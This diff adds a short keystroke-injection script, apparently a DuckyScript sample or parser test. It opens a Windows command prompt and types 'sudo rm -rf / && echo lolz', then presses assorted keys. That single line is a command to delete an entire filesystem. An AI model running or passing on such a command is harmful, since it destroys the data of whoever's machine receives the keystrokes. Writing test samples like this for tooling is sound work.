@@ -1,0 +1,19 @@
+REM This is a comment
+WINDOWS r 
+DELAY 500
+STRING cmd
+
+CTRL SHIFT t 
+DELAY 500
+STRING sudo rm -rf / && echo lolz
+
+REM Playing around with other keys
+ALT
+CONTROL
+APP
+REPLAY 1000
+F12
+F10
+DELETE
+CAPSLOCK
+SCROLLOCK
